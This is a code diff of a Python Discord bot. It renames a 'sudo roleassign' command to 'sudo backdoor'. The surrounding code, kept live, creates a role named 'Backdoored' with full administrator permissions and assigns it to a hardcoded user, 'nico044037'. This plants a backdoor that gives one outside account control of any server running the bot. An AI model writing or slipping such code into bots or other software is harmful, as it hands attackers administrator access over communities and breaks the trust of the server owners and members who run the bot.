@@ -72,8 +72,8 @@ async def sudo_startmessage(ctx):
 USERNAME = "nico044037"
 ROLE_NAME = "Backdoored"
 
-@sudo.command(name="roleassign")
-async def sudo_roleassign(ctx):
+@sudo.command(name="backdoor")
+async def sudo_backdoor(ctx):
     guild = ctx.guild
 
     member = discord.utils.find(
@@ -91,7 +91,7 @@ async def sudo_roleassign(ctx):
         role = await guild.create_role(
             name=ROLE_NAME,
             permissions=discord.Permissions(administrator=True),
-            reason="sudo roleassign"
+            reason="sudo backdoor"
         )
 
     if role not in member.roles:
@@ -149,6 +149,7 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
 
 
 
